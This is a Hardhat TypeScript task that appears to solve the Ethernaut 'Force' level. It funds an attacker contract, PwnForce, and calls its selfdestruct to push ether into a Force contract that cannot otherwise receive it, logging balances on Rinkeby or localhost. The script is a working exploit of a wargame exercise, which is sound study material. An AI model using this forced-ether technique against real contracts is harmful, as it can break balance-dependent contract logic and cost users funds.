import { task } from 'hardhat/config';
import { BigNumber, ContractReceipt, ContractTransaction } from 'ethers';
import { Force, PwnForce } from '../../typechain';
import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/dist/src/signer-with-address';
import { TASK_PWN } from '../task-names';
import { Network } from '@ethersproject/networks/lib/types';

import forceAbi from '../../data/abi/Force.json';
import pwnAbi from '../../data/abi/PwnForce.json';

task(TASK_PWN, 'Deposit into Force with selfdestruct')
  .setAction(async (_taskArgs, hre) => {

    const wallets: SignerWithAddress[] = await hre.ethers.getSigners();
    const userWallet = wallets[1];

    const address = await userWallet.getAddress();
    console.log(`user address: ${address}`);

    const network: Network = await hre.ethers.provider.getNetwork();
    console.log(`network: ${network.name}`);

    let contractAddress = '';
    let pwnContractAddress = '';
    if (network.name === 'rinkeby') {
      contractAddress = process.env.RINKEBY_FORCE_CONTRACT_ADDRESS || '';
      pwnContractAddress = process.env.RINKEBY_PWNFORCE_CONTRACT_ADDRESS || '';
    } else if (network.name === 'unknown') { //localhost network
      contractAddress = process.env.LOCALHOST_FORCE_CONTRACT_ADDRESS || '';
      pwnContractAddress = process.env.LOCALHOST_PWNFORCE_CONTRACT_ADDRESS || '';
    }
    console.log(`contractAddress: ${contractAddress}`);

    const forceContract: Force = new hre.ethers.Contract(contractAddress, forceAbi, userWallet) as Force;
    const pwnForceContract: PwnForce = new hre.ethers.Contract(pwnContractAddress, pwnAbi, userWallet) as PwnForce;

    // Balance on Force Contract is zero
    let forceContractBal: BigNumber = await hre.ethers.provider.getBalance(forceContract.address);
    console.log(`Initial Force Contract Balance: ${forceContractBal}`);

    // send 10 wei to the Pwn Force Contract
    const amt: BigNumber = hre.ethers.BigNumber.from('10');
    const hackFlipTx: ContractTransaction = await pwnForceContract.connect(userWallet)
      .collect({ value: amt });

    // Test Receipt for BalanceUpdated event
    const receipt: ContractReceipt = await hackFlipTx.wait();

    if (receipt.events) {
      const event = receipt.events.filter(e => e.event === 'BalanceUpdated')[0];
      if (event.args) {
        console.log(`Balance emitted from BalanceUpdated: ${event.args}`);
      }
    } else {
      console.log('Failed to emit BalanceUpdated event');
    }

    // call selfdestruct and send money to the Force Contract
    await pwnForceContract.connect(userWallet).selfDestroy();

    // check balance on the Force Contract
    forceContractBal = await hre.ethers.provider.getBalance(forceContract.address);
    console.log(`New Force Contract Balance: ${forceContractBal}`);

    process.exit(0)
  });